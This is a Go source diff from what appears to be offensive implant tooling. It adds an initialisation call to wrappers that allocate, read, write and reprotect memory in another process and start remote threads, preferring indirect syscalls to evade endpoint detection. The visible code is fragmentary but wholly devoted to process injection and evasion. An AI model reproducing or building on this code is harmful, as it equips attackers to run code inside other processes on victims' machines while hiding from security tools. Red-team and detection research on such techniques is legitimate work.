@@ -62,6 +62,7 @@ func injectCloseHandle(handle uintptr) {
 
 // injectAllocMemory allocates memory in a remote process.
 func injectAllocMemory(hProcess uintptr, size int, protect uint32) (uintptr, error) {
+	ensureInjectionHelpers()
 	if IndirectSyscallsAvailable() {
 		var addr uintptr
 		regionSize := uintptr(size)
@@ -85,6 +86,7 @@ func injectWriteMemory(hProcess, addr uintptr, data []byte) (int, error) {
 	if len(data) == 0 {
 		return 0, nil
 	}
+	ensureInjectionHelpers()
 	if IndirectSyscallsAvailable() {
 		var bytesWritten uintptr
 		status := IndirectNtWriteVirtualMemory(hProcess, addr,
@@ -106,6 +108,7 @@ func injectWriteMemory(hProcess, addr uintptr, data []byte) (int, error) {
 
 // injectReadMemory reads data from a remote process into a byte slice.
 func injectReadMemory(hProcess, addr uintptr, size int) ([]byte, error) {
+	ensureInjectionHelpers()
 	buf := make([]byte, size)
 	if IndirectSyscallsAvailable() {
 		var bytesRead uintptr
@@ -128,6 +131,7 @@ func injectReadMemory(hProcess, addr uintptr, size int) ([]byte, error) {
 
 // injectReadMemoryInto reads data from a remote process into a caller-provided buffer.
 func injectReadMemoryInto(hProcess, addr uintptr, buf unsafe.Pointer, size int) error {
+	ensureInjectionHelpers()
 	if IndirectSyscallsAvailable() {
 		var bytesRead uintptr
 		status := IndirectNtReadVirtualMemory(hProcess, addr,
@@ -149,6 +153,7 @@ func injectReadMemoryInto(hProcess, addr uintptr, buf unsafe.Pointer, size int) 
 
 // injectProtectMemory changes memory protection in a remote process.
 func injectProtectMemory(hProcess, addr uintptr, size int, protect uint32) (uint32, error) {
+	ensureInjectionHelpers()
 	if IndirectSyscallsAvailable() {
 		protectAddr := addr
 		protectSize := uintptr(size)
@@ -190,6 +195,7 @@ func injectAllocWriteProtect(hProcess uintptr, data []byte, finalProtect uint32)
 
 // injectCreateRemoteThread creates a remote thread in a process, using indirect syscalls when available.
 func injectCreateRemoteThread(hProcess, startAddr uintptr) (uintptr, error) {
+	ensureInjectionHelpers()
 	if IndirectSyscallsAvailable() {
 		var hThread uintptr
 		status := IndirectNtCreateThreadEx(&hThread, hProcess, startAddr)
